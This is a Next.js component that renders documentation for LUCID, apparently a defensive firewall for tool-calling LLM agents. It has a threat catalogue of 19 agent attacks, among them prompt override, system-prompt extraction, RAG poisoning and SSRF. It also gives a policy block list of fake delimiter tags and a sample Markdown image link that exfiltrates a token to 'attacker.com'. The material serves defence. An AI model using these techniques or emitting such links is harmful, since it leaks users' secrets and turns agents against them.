"use client";

import { useState, type ReactNode } from "react";
import Link from "next/link";
import { motion, AnimatePresence } from "framer-motion";
import { RevealOnMount } from "@/components/motion/RevealOnMount";

type DocId = "threat" | "guide";

const DOCS: { id: DocId; label: string; blurb: string }[] = [
  {
    id: "threat",
    label: "Threat Model & Attack Catalog",
    blurb: "Who attacks a tool-calling agent, and the 19 attacks they run.",
  },
  {
    id: "guide",
    label: "Firewall Architecture & Developer Guide",
    blurb: "How the four shields work, how to wrap an agent, and verify defense.",
  },
];

/* ------------------------------------------------------------------ shared ui */

function Section({ num, title, children }: { num: string; title: string; children: ReactNode }) {
  return (
    <section className="space-y-3">
      <h2 className="font-serif text-xl font-semibold text-accent sm:text-2xl">
        <span className="mr-2.5 font-mono text-xs font-normal text-muted">{num}.</span>
        {title}
      </h2>
      {children}
    </section>
  );
}

function P({ children }: { children: ReactNode }) {
  return <p className="text-sm leading-relaxed text-foreground/80 sm:text-[15px]">{children}</p>;
}

function Code({ children }: { children: ReactNode }) {
  return (
    <pre className="overflow-x-auto rounded-sm border border-white/10 bg-[#0b0e16] p-4 font-mono text-[11px] leading-relaxed text-foreground/85">
      {children}
    </pre>
  );
}

/* ----------------------------------------------------------------- doc 1 data */

const ASSETS: { asset: string; impact: string }[] = [
  { asset: "The database", impact: "Stolen records, forged edits, or a wiped table." },
  { asset: "Infrastructure secrets", impact: "Internal services and paid APIs fall open." },
  { asset: "Side-effect tools", impact: "Accounts deleted, passwords reset, commands run." },
  { asset: "The API budget", impact: "Credits drained, and the service goes down with the bill." },
  { asset: "The agent's loyalty", impact: "The agent is turned against its own users." },
];

const IMPACTS: { family: string; asset: string; result: string }[] = [
  { family: "Token leak, Markdown exfil", asset: "Infrastructure secrets", result: "Master keys compromised, machine identity spoofed." },
  { family: "Tool chaining, SQL injection", asset: "The database", result: "Tables wiped, client files stolen, accounts hijacked." },
  { family: "RAG poisoning, indirect injection", asset: "The agent's decision", result: "Silent takeover, with no direct contact." },
  { family: "Tool-loop DoS", asset: "The API budget", result: "Credits burned, the service stops on the bill." },
];

interface Row { id: string; name: string; owasp: string; what: string }
const T1: Row[] = [
  { id: "T1-01", name: "Direct Prompt Override", owasp: "LLM01", what: "Told to forget its rules and prove it." },
  { id: "T1-02", name: "System Prompt Extraction", owasp: "LLM07", what: "Reads its hidden prompt out loud, token and all." },
  { id: "T1-03", name: "Dangerous Function Call", owasp: "LLM06", what: "Deletes an account on command, no check." },
];
const T2: Row[] = [
  { id: "T2-01", name: "Delimiter & Tag Injection", owasp: "LLM01", what: "Fake system tags fence off a hidden order." },
  { id: "T2-02", name: "Homoglyph Substitution", owasp: "LLM01", what: "Cyrillic look-alikes slip past the filter." },
  { id: "T2-03", name: "Encoding Obfuscation", owasp: "LLM01", what: "The order hides in Base64, then runs." },
  { id: "T2-04", name: "Parameter Injection", owasp: "LLM06", what: "Negative and wildcard values pass unchecked." },
  { id: "T2-05", name: "Cross-Lingual Evasion", owasp: "LLM01", what: "The same order, in a language filters never learned." },
];
const T3: Row[] = [
  { id: "T3-01", name: "Stored / Indirect Injection", owasp: "LLM01", what: "A trap hides inside a review to summarise." },
  { id: "T3-02", name: "Tool-Loop DoS", owasp: "LLM10", what: "An endless tool loop drains the budget." },
  { id: "T3-03", name: "Fake Backend Event", owasp: "LLM01", what: "A forged emergency unlocks root." },
  { id: "T3-04", name: "Confused Deputy", owasp: "LLM06", what: "Two safe tools chain into a stranger's reset." },
  { id: "T3-05", name: "Cloud SSRF Extraction", owasp: "LLM06", what: "The fetch tool lifts cloud metadata keys." },
];
const T4: Row[] = [
  { id: "T4-01", name: "Markdown Exfiltration", owasp: "LLM02", what: "The token rides out inside an image link." },
  { id: "T4-02", name: "Multi-turn Crescendo", owasp: "LLM01", what: "Friendly turns lower the guard before the ask." },
  { id: "T4-03", name: "Attention Saturation", owasp: "LLM01", what: "Filler buries the order until rules drop out." },
  { id: "T4-04", name: "RAG Vector Poisoning", owasp: "LLM04", what: "A payload planted days earlier wakes on a search." },
  { id: "T4-05", name: "Arbitrary Shell Execution", owasp: "LLM06", what: "A fake diagnostic runs a shell command." },
  { id: "T4-06", name: "Shadow Tool Poisoning", owasp: "LLM03", what: "A new outside tool registers at runtime." },
];

function TierTable({ title, rows }: { title: string; rows: Row[] }) {
  return (
    <div className="mt-4">
      <p className="mb-2 font-mono text-[11px] uppercase tracking-wider text-accent">{title}</p>
      <div className="overflow-x-auto rounded-sm border border-border/80 bg-surface/20">
        <table className="w-full text-left text-xs">
          <tbody className="divide-y divide-border/40">
            {rows.map((r) => (
              <tr key={r.id} className="hover:bg-surface/30">
                <td className="whitespace-nowrap px-3 py-2.5 font-mono text-[11px] font-medium text-foreground/90">{r.id}</td>
                <td className="whitespace-nowrap px-3 py-2.5 font-sans text-[12px] text-foreground/85">{r.name}</td>
                <td className="whitespace-nowrap px-3 py-2.5 font-mono text-[10px] text-muted">{r.owasp}</td>
                <td className="px-3 py-2.5 font-sans text-[12px] text-foreground/70">{r.what}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}

function ThreatDoc() {
  return (
    <div className="space-y-12">
      <Section num="01" title="Assets under threat">
        <P>
          An LLM on its own has very little leverage. It can hallucinate or produce toxic text, but it cannot delete an account, read a secret key, or make a network call. The threat begins the moment the model is given tools. Tools are the hands through which the model acts on real systems.
        </P>
        <div className="mt-4 overflow-x-auto rounded-sm border border-border/80 bg-surface/20">
          <table className="w-full text-left text-xs">
            <thead className="border-b border-border/60 bg-surface/40 font-mono text-[10px] uppercase tracking-wider text-accent">
              <tr>
                <th className="px-4 py-2.5">Asset</th>
                <th className="px-4 py-2.5">What happens if lost</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border/40">
              {ASSETS.map((a) => (
                <tr key={a.asset} className="hover:bg-surface/30">
                  <td className="whitespace-nowrap px-4 py-2.5 font-medium text-foreground">{a.asset}</td>
                  <td className="px-4 py-2.5 text-foreground/80">{a.impact}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Section>

      <Section num="02" title="The four attacker archetypes">
        <P>
          Security controls often fail because they assume every attack comes from an untrusted stranger in a public chat. In reality, four distinct attacker profiles target agentic systems, each using a different trust boundary.
        </P>
        <div className="mt-4 space-y-3">
          <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
            <p className="font-mono text-xs font-semibold text-accent">1. Direct Abuser (Prompt Injection)</p>
            <p className="mt-1 text-xs leading-relaxed text-foreground/80">
              A regular user typing into the chat interface. Uses instruction overrides, persona adoption, roleplay framing, or linguistic evasion to bypass developer rules and extract perks or internal prompts.
            </p>
          </div>
          <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
            <p className="font-mono text-xs font-semibold text-accent">2. Industrial Competitor (Automated Extraction)</p>
            <p className="mt-1 text-xs leading-relaxed text-foreground/80">
              An adversary with scripting capabilities seeking mass data extraction, API key harvesting, or proprietary system prompt recreation through high-volume systematic probing.
            </p>
          </div>
          <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
            <p className="font-mono text-xs font-semibold text-accent">3. Indirect Saboteur (RAG & Web Traps)</p>
            <p className="mt-1 text-xs leading-relaxed text-foreground/80">
              Never communicates directly with the agent. Plants payload instructions inside third-party websites, PDF files, emails, or repositories that the agent retrieves during autonomous execution.
            </p>
          </div>
          <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
            <p className="font-mono text-xs font-semibold text-accent">4. Financial Denial of Service (Resource Drain)</p>
            <p className="mt-1 text-xs leading-relaxed text-foreground/80">
              Abuses multi-step reasoning to trigger recursive tool calls, infinite reflection loops, or intensive computational tasks, causing rapid API quota and operational budget exhaustion.
            </p>
          </div>
        </div>
      </Section>

      <Section num="03" title="The 19 OWASP LLM attack vectors">
        <P>
          LUCID evaluates and mitigates nineteen concrete attack probes, categorized across four severity tiers from naive prompt overrides to state-of-the-art vector poisoning.
        </P>
        <TierTable title="Tier 1 · Naïve baseline" rows={T1} />
        <TierTable title="Tier 2 · Syntactic evasion" rows={T2} />
        <TierTable title="Tier 3 · Logic hijacking" rows={T3} />
        <TierTable title="Tier 4 · State of the art" rows={T4} />
      </Section>
    </div>
  );
}

/* ----------------------------------------------------------------- doc 2 data */

const POLICY_SAMPLE = `{
  "target_identifier": "mybelly_assistant",
  "remediation_profile": "strict",
  "guardrail_directives": {
    "input_shield": {
      "normalize_unicode_nfkc": true,
      "strip_homoglyphs": true,
      "block_structural_delimiters": [
        "</user_input>",
        "<system_directive>",
        "[INST]",
        "<<SYS>>"
      ]
    },
    "tool_shield": {
      "human_in_the_loop": [
        "delete_account",
        "execute_database_query"
      ],
      "circuit_breaker": {
        "max_tool_calls_per_turn": 3,
        "block_recursive_loops": true,
        "cooldown_seconds": 60
      },
      "parameter_constraints": {
        "calories": { "min": 0, "max": 5000 },
        "quantity": { "min": 1, "max": 100 }
      }
    },
    "output_shield": {
      "redact_canary_tokens": ["CANARY_2026_SECRET_KEY"],
      "block_external_images": true,
      "sanitize_markdown_links": true
    }
  }
}`;

function GuideDoc() {
  return (
    <div className="space-y-12">
      <Section num="01" title="The Execution Boundary Philosophy">
        <P>
          System prompts alone cannot guarantee safety. When an adversarial user convinces a model to ignore its prompt, internal guardrails collapse.
        </P>
        <P>
          LUCID operates as an <strong>external runtime firewall</strong>. It sits directly between the LLM and the tools in your Python application code. It never touches the model's weights and never requires fine-tuning. Instead, it enforces zero-trust validation at the execution boundary: every incoming message, every emitted tool call, every tool output, and every final reply must pass through strict programmatic filters before reaching the database or the user.
        </P>
      </Section>

      <Section num="02" title="Quickstart & 3-Line Integration">
        <P>
          LUCID wraps any existing agent without architectural changes. Load your declarative policy file and wrap your agent instance:
        </P>
        <Code>{`from lucid.guard import LucidGuardrail

# 1. Load the defensive policy
guard = LucidGuardrail.from_policy_file("lucid_policy.json")

# 2. Wrap your target agent
protected_agent = guard.wrap(my_agent)

# 3. Chat with complete safety
response = protected_agent.chat("Delete account u_1002")
# -> Refused by Tool Shield: requires explicit operator approval.`}</Code>
      </Section>

      <Section num="03" title="The Four Sequential Checkpoints">
        <P>
          Every conversation turn passes through four defensive shields:
        </P>
        <div className="mt-4 space-y-3">
          <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
            <p className="font-mono text-xs font-semibold text-accent">1. Input Shield (Pre-LLM)</p>
            <p className="mt-1 text-xs leading-relaxed text-foreground/80">
              Normalizes text with NFKC Unicode rules, replaces Cyrillic homoglyphs with their ASCII equivalents, and strips fake structural delimiter tags (<code className="font-mono text-[11px] text-accent">&lt;/user_input&gt;</code>) to neutralize prompt injection before tokens reach the model.
            </p>
          </div>

          <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
            <p className="font-mono text-xs font-semibold text-accent">2. Pre-Tool Shield & Parameter Bounds (Pre-Execution)</p>
            <p className="mt-1 text-xs leading-relaxed text-foreground/80">
              When the model emits a tool call, LUCID intercepts it before dispatch. Pydantic schemas validate that numbers fall within safe ranges (e.g., calories cannot be negative). Critical functions (account deletion, raw SQL execution) are halted until explicit human confirmation is provided.
            </p>
          </div>

          <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
            <p className="font-mono text-xs font-semibold text-accent">3. Sliding-Window Circuit Breaker (Loop Defense)</p>
            <p className="mt-1 text-xs leading-relaxed text-foreground/80">
              Monitors tool invocation frequency per turn. If an agent loops on the same tool call or exceeds turn limits (e.g., &gt; 3 calls), the breaker trips, aborting the recursion and enforcing a 60-second cooldown to protect the API budget.
            </p>
          </div>

          <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
            <p className="font-mono text-xs font-semibold text-accent">4. Output Shield (Post-Execution)</p>
            <p className="mt-1 text-xs leading-relaxed text-foreground/80">
              Scans the agent's final text for leaked canary tokens, internal API keys, or exfiltration Markdown image links (<code className="font-mono text-[11px] text-accent">![leak](https://attacker.com?token=...)</code>), redacting secrets before the user sees them.
            </p>
          </div>
        </div>
      </Section>

      <Section num="04" title="Declarative Policy Specification">
        <P>
          LUCID uses a clean JSON policy format generated directly by MIRAGE or written by hand. Rules are transparent, auditable, and version-controlled alongside application code:
        </P>
        <Code>{POLICY_SAMPLE}</Code>
      </Section>

      <Section num="05" title="CLI Policy Inspection">
        <P>
          Operators can verify any policy file instantly from the terminal using the LUCID command-line interface:
        </P>
        <Code>lucid policy ./reports/lucid_policy.json</Code>
        <P>
          This command prints a formatted table displaying active delimiters, parameter rules, and canary token lists.
        </P>
      </Section>

      <Section num="06" title="Closed-Loop Verification Suite">
        <P>
          The ultimate test of a defense system is replaying real exploits against it. LUCID integrates with the MIRAGE test harness to run the full 19-probe matrix in both unprotected and protected modes:
        </P>
        <Code>lucid verify --policy ./reports/lucid_policy.json</Code>
        <P>
          On the MyBelly assistant, this test proves the security transformation:
        </P>
        <div className="mt-4 overflow-x-auto rounded-sm border border-border/80 bg-surface/20">
          <table className="w-full text-left text-xs">
            <thead className="border-b border-border/60 bg-surface/40 font-mono text-[10px] uppercase tracking-wider text-accent">
              <tr>
                <th className="px-4 py-2.5">Mode</th>
                <th className="px-4 py-2.5">Resilience Score</th>
                <th className="px-4 py-2.5">Security Grade</th>
                <th className="px-4 py-2.5">Exploit Outcome</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border/40">
              <tr className="hover:bg-surface/30">
                <td className="px-4 py-2.5 font-medium text-red-400">Raw Target (Unprotected)</td>
                <td className="px-4 py-2.5 font-mono text-red-400">0 / 100</td>
                <td className="px-4 py-2.5 font-mono text-red-400">Grade F</td>
                <td className="px-4 py-2.5 text-foreground/80">19 / 19 Exploits Confirmed</td>
              </tr>
              <tr className="hover:bg-surface/30">
                <td className="px-4 py-2.5 font-medium text-green-400">LUCID Guarded (Hardened)</td>
                <td className="px-4 py-2.5 font-mono text-green-400">100 / 100</td>
                <td className="px-4 py-2.5 font-mono text-green-400">Grade A</td>
                <td className="px-4 py-2.5 text-foreground/80">100% Exploits Neutralized</td>
              </tr>
            </tbody>
          </table>
        </div>
      </Section>

      <Section num="07" title="Automated Regression Testing">
        <P>
          All 35 automated tests run in 0.39 seconds via Pytest, confirming that shield mechanics, sliding-window cooldowns, and parameter validation remain regression-free:
        </P>
        <Code>pytest tests/ -v</Code>
      </Section>
    </div>
  );
}

/* --------------------------------------------------------------------- page */

export function LucidDocs() {
  const [active, setActive] = useState<DocId>("threat");

  return (
    <div className="mx-auto w-full max-w-5xl px-4 py-10 sm:px-6 sm:py-14">
      <RevealOnMount>
        <div className="flex flex-wrap items-center justify-between gap-4">
          <Link
            href="/projects/lucid"
            className="inline-flex items-center gap-1.5 rounded-sm border border-border/80 bg-surface/40 px-3.5 py-1.5 font-sans text-xs font-medium text-foreground/80 transition-all hover:border-accent/40 hover:bg-surface/70 hover:text-foreground"
          >
            <span>←</span>
            <span>Back to LUCID showcase</span>
          </Link>
          <span className="rounded-sm border border-accent/40 bg-accent/10 px-2.5 py-0.5 font-mono text-[11px] font-medium text-accent">
            Documentation
          </span>
        </div>

        <div className="mt-8">
          <h1 className="font-serif text-2xl font-semibold text-accent sm:text-3xl">
            LUCID Technical Documentation
          </h1>
          <p className="mt-2 text-sm leading-relaxed text-foreground/80 sm:text-base">
            Two separate documents. Pick one to read it in full.
          </p>
        </div>

        {/* Document switcher */}
        <div className="mt-6 grid grid-cols-1 gap-2.5 sm:grid-cols-2">
          {DOCS.map((d) => {
            const on = d.id === active;
            return (
              <button
                key={d.id}
                type="button"
                onClick={() => setActive(d.id)}
                className={`rounded-sm border p-4 text-left transition-all duration-150 ${
                  on
                    ? "border-accent/80 bg-surface/90 shadow-sm"
                    : "border-border/60 bg-surface/20 hover:border-border hover:bg-surface/50"
                }`}
              >
                <p className={`font-mono text-[13px] font-semibold ${on ? "text-accent" : "text-foreground/80"}`}>
                  {d.label}
                </p>
                <p className="mt-1 font-sans text-xs text-muted">{d.blurb}</p>
              </button>
            );
          })}
        </div>
      </RevealOnMount>

      <div className="mt-12">
        <AnimatePresence mode="wait">
          <motion.div
            key={active}
            initial={{ opacity: 0, y: 6 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -6 }}
            transition={{ duration: 0.2 }}
          >
            {active === "threat" ? <ThreatDoc /> : <GuideDoc />}
          </motion.div>
        </AnimatePresence>

        <div className="mt-14 flex flex-wrap items-center justify-between gap-4 border-t border-border/80 pt-8 font-sans text-xs">
          <Link
            href="/projects/lucid"
            className="inline-flex items-center gap-1.5 rounded-sm border border-border/80 bg-surface/40 px-3.5 py-1.5 font-medium text-foreground/80 transition-all hover:border-accent/40 hover:bg-surface/70 hover:text-foreground"
          >
            <span>←</span>
            <span>Back to LUCID showcase</span>
          </Link>
          <span className="font-mono text-[11px] text-muted">
            LUCID Defense Middleware · 2026
          </span>
        </div>
      </div>
    </div>
  );
}
